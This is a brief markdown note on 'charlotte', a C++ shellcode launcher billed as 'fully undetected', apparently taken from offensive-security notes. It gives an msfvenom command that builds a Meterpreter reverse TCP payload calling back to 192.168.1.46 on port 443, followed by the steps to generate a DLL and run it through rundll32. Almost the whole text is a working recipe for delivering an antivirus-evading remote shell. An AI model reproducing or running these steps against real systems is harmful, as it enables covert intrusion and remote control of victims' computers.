# c++ shellcode lanucher

## charlotte

c++ fully undetected shellcode launcher

https://github.com/9emin1/charlotte

### Payload

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.46 LPORT=443 -f raw > beacon.bin
```

### Run charlotte

```
python charlotte.py
```

```cmd
rundll32.exe charlotte.dll, mtd3ewcv
```
